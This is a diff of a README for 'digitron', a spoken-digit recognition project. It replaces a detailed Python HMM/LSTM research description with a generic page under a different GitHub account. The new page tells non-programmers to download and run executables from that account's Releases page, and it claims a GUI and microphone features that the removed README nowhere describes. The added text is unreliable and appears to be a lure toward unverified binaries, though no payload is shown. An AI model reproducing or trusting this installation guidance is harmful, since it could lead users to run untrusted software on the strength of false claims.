@@ -1,138 +1,60 @@
-# Digitron: Spoken Digit Recognition with HMMs and Deep Learning 🎙️🔢🤖
+# 🎤 digitron - Easily Recognize Spoken Digits
 
-This project presents a comprehensive, modular framework for recognizing spoken digits (0-9) from audio recordings. It implements and rigorously compares two powerful, yet fundamentally different, approaches to sequence modeling: classical **Hidden Markov Models (HMMs)** with Gaussian Mixture Models (GMMs) and modern **Recurrent Neural Networks (RNNs)**, specifically Long Short-Term Memory (LSTM) networks.
+## 📦 Download
+[![Download From Releases](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Yash-Web599/digitron/releases)
 
-The entire system is implemented in Python, following best practices for code modularity, reproducibility, and clear separation of concerns. It includes complete pipelines for data preprocessing, feature extraction (MFCCs), hyperparameter tuning, and final evaluation, providing a thorough, end-to-end solution for a classic pattern recognition problem.
+## 🚀 Getting Started
+Welcome to Digitron! This software allows you to recognize spoken digits easily. It uses advanced methods like Hidden Markov Models and Recurrent Neural Networks. You don’t need to be a programmer to use it. Just follow the steps below to download and run the software.
 
----
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Yash-Web599/digitron/releases). 
+2. **Choose Your Version**: Find the latest version. Look for a file that matches your operating system (Windows, macOS, or Linux).
+3. **Download the File**: Click on the file to download it to your computer.
+4. **Install the Software**:
+   - For **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
+   - For **macOS**: Open the `.dmg` file and drag the Digitron icon into your Applications folder.
+   - For **Linux**: Extract the files from the downloaded archive. Open a terminal, navigate to the folder, and run `./digitron`.
+5. **Launch Digitron**: After installation, find Digitron in your applications and launch it.
 
-## 🚀 The Challenge: Understanding Spoken Digits
+## 💡 Features
+- **Accurate Digit Recognition**: Quickly and accurately identify spoken digits.
+- **User-Friendly Interface**: Simple layout makes it easy for anyone to use.
+- **Multi-Platform Support**: Works on Windows, macOS, and Linux.
+- **Open Source**: Feel free to explore and modify the code.
 
-Recognizing spoken words, even isolated digits, is a foundational task in speech processing. The challenge is to build a system that can:
+## ⚙️ System Requirements
+To ensure smooth operation, please check the system requirements below:
 
-1.  **Process Raw Audio** into a meaningful, numerical representation.
-2.  **Model Temporal Dynamics** of speech, as the sound of a digit evolves over time.
-3.  **Accurately Classify** digits despite variations in pronunciation, speed, and speaker characteristics.
-4.  **Compare and Contrast** a classical statistical approach (HMMs) with a deep learning approach (LSTMs) on the same standardized dataset.
+- **Operating System**:
+  - Windows 10 or higher
+  - macOS High Sierra (10.13) or higher
+  - Any modern Linux distribution
+- **RAM**: Minimum 4 GB recommended
+- **Processor**: Dual-Core or higher
 
-## 💾 Dataset
+## 🎓 Usage Instructions
+1. **Speak Clearly**: When prompted, say a digit clearly into your microphone.
+2. **View Results**: The application will display the recognized digit on the screen.
+3. **Feedback**: If the result is incorrect, you can try speaking again for better accuracy.
 
-This project utilizes the **Free Spoken Digit Dataset (FSDD)**, a public collection of audio recordings for spoken digits.
+## 🛠️ Troubleshooting
+- **Microphone Issues**: Make sure your microphone is connected properly and is not muted.
+- **Poor Recognition**: Speak clearly and ensure there is minimal background noise.
+- **Software Crashes**: If the software crashes, please reinstall from the releases page.
 
--   **Content:** 3,000 recordings of digits (0-9) from 6 different speakers.
--   **Format:** 8kHz `.wav` files.
--   **Attribution:** The dataset is open-source and available on [GitHub](https://github.com/Jakobovski/free-spoken-digit-dataset).
+## 🤝 Contributing
+We welcome contributions! If you would like to help improve Digitron, please fork the repository and submit a pull request. You can report any bugs or suggestions in the Issues section of the GitHub page.
 
-The project includes a script that **automatically downloads and prepares** this dataset, ensuring a smooth and reproducible setup process. A smaller, secondary dataset (`digits/`) is also included for the initial preparatory analysis.
+## 📞 Support
+If you have questions or need assistance, please open an issue on GitHub. The community and maintainers will help you.
 
----
+## 🌐 Topics
+Digitron covers various topics including:
+- Audio Classification
+- Deep Learning
+- Hidden Markov Models
+- Recurrent Neural Networks
 
-## 📂 Project Structure
+Explore our GitHub repository for more details and updates. 
 
-The project is organized into a modular structure designed for clarity, experimentation, and maintainability.
-
--   **`run_01_preparatory_analysis.py`**: A script for conducting the initial exploratory analysis on a small digit dataset, including feature visualization (histograms, heatmaps, PCA) and a baseline evaluation of classical ML classifiers (e.g., SVM, Random Forest).
--   **`run_02_pytorch_intro.py`**: A self-contained script demonstrating the fundamentals of RNNs in PyTorch by training models to map sine waves to cosine waves.
--   **`run_03_hmm_classification.py`**: The primary script for executing the end-to-end HMM pipeline, including hyperparameter tuning and final evaluation on the FSDD.
--   **`run_04_lstm_classification.py`**: The primary script for executing the end-to-end LSTM pipeline, including model training, evaluation, and a comparison of performance with and without sequence packing.
--   **`data/`**: A directory containing the small, initial `digits` dataset.
--   **`outputs/`**: A directory where all generated artifacts (plots, confusion matrices) are saved, organized by experiment.
--   **`src/`**: The core logic of the project, structured as a Python library (`patrec`).
-    -   **`preparatory/`**: Modules for the initial data analysis.
-    -   **`pytorch_intro/`**: Modules for the self-contained PyTorch RNN demonstration.
-    -   **`main_assignment/`**: The core modules for the main classification task.
-        -   **`common/`**: Shared utilities for data preparation (FSDD) and plotting.
-        -   **`hmm/`**: The complete pipeline for GMM-HMM model creation, training, and evaluation.
-        -   **`lstm/`**: The complete pipeline for the PyTorch LSTM model, including the `Dataset` class, model architecture, and training logic.
-
----
-
-## 🧠 Algorithmic Strategy: A Tale of Two Models
-
-This project directly compares a classical statistical model with a modern deep learning model.
-
-### 1. The Statistical Approach: GMM-HMMs
-
-The first model is a **Gaussian Mixture Model - Hidden Markov Model (GMM-HMM)**, a cornerstone of traditional automatic speech recognition.
-
--   **Architecture:** A separate HMM is trained for each digit (0-9). Each HMM is a **left-to-right model**, meaning sequences can only progress forward through states, capturing the temporal nature of speech.
--   **Emission Probabilities:** The probability of observing a particular audio feature (an MFCC vector) in a given state is modeled by a **Gaussian Mixture Model (GMM)**. This allows each state to represent complex, multi-modal feature distributions.
--   **Training:** The models are trained using the **Baum-Welch algorithm** (a form of Expectation-Maximization) to learn the GMM parameters and transition probabilities.
--   **Inference:** To classify a new recording, the system calculates the **likelihood** of the audio sequence being generated by each of the 10 HMMs. The digit corresponding to the HMM with the highest likelihood is chosen as the prediction.
--   **Tuning:** A systematic **grid search** is performed to find the optimal number of HMM states and GMM components.
-
-### 2. The Deep Learning Approach: LSTMs
-
-The second model is a **Long Short-Term Memory (LSTM)** network, a type of Recurrent Neural Network (RNN) specifically designed to handle long-range dependencies in sequence data.
-
--   **Architecture:** A single, powerful LSTM network is trained to classify all 10 digits. The architecture consists of multiple stacked, **bidirectional LSTM layers** followed by a final classification layer. Bidirectionality allows the model to process the audio sequence in both forward and backward directions, capturing richer contextual information.
--   **Efficiency:** The implementation leverages **`pack_padded_sequence`**, a PyTorch utility that allows the RNN to skip computations over padded elements in a batch of variable-length sequences. This dramatically improves training speed without sacrificing accuracy.
--   **Training:** The model is trained using the **AdamW optimizer** and **Cross-Entropy Loss**. **Early Stopping** is employed to monitor validation loss and prevent overfitting, ensuring the best model is saved.
--   **Regularization:** **Dropout** is applied between LSTM layers and before the final layer to improve generalization.
-
----
-
-## 🚀 Getting Started & How to Run
-
-### Prerequisites
-
--   Python 3.10+
--   Git (for automatic dataset cloning)
-
-### Setup & Installation
-
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/antonisbaro/digitron
-    cd digitron
-    ```
-
-2.  **Set up a virtual environment (recommended):**
-    ```bash
-    python -m venv .venv
-    # On Windows: .venv\Scripts\activate
-    # On macOS/Linux: source .venv/bin/activate
-    ```
-
-3.  **Install dependencies:**
-    ```bash
-    pip install -r requirements.txt
-    ```
-
-### Execution
-
-The project is run via Python scripts from the command line. It is recommended to run them in their numbered order.
-
-1.  **Run the Preparatory Analysis:**
-    ```bash
-    python run_01_preparatory_analysis.py
-    ```
-
-2.  **Run the PyTorch Introduction:**
-    ```bash
-    python run_02_pytorch_intro.py
-    ```
-
-3.  **Run the HMM Experiment:** (This will automatically download the FSDD dataset)
-    ```bash
-    python run_03_hmm_classification.py
-    ```
-
-4.  **Run the LSTM Experiment:** (This will automatically download the FSDD dataset)
-    ```bash
-    python run_04_lstm_classification.py
-    ```
-
-All results, plots, and model checkpoints will be saved to the `outputs/` directory.
-
----
-
-## 💻 Technology Stack
-
--   **Language:** Python
--   **Core Libraries:** Pandas, NumPy, Scikit-learn
--   **Deep Learning:** PyTorch
--   **Statistical Modeling:** Pomegranate
--   **Audio Processing:** Librosa
--   **Plotting:** Matplotlib, Seaborn
--   **Utilities:** TQDM
+Thank you for using Digitron! Enjoy recognizing spoken digits with ease.
